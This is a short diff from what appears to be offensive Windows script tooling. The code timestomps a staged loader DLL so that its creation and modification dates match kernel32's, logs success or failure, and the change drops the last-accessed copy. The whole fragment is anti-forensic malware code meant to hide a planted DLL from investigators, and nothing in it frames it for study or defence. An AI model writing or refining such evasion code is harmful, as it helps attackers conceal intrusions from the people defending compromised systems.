@@ -73,7 +73,6 @@ try {
     var staged = fso.GetFile(loaderDll);
     staged.DateCreated = kernel32.DateCreated;
     staged.DateLastModified = kernel32.DateLastModified;
-    staged.DateLastAccessed = kernel32.DateLastAccessed;
     log("[+] Timestomp complete");
 } catch(e) {
     log("[-] Timestomp FAILED: " + e.message);
